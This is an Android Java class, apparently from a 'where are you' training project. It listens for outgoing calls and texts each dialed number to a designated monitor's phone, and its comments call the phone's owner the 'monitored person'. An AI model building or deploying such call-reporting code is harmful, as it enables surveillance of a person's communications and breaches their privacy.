package cn.tedu.whereareyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.widget.Toast;

public class ToPhoneListenerReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context ct, Intent it) {
		// TODO Auto-generated method stub
		Toast.makeText(ct, "正在处理去电监控功能", Toast.LENGTH_LONG).show();
		//当检查到被监控者手机向外拨打电话时，准备开始进行去电监控操作
		if(it.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)){
			//补充：获得去电号码
			String qudiannumber = it.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
			//当向外拨打电话不是监控者时，才开始进行监控
			if(!qudiannumber.equals(WayInformations.LPPN)){
				//向监控者手机发送一条监控短信
				SmsManager sm = SmsManager.getDefault();
				String message = "TA is Called Phone to "+ qudiannumber;
				sm.sendTextMessage(WayInformations.LPPN, null, message, null, null);
			}
		}
	}

}
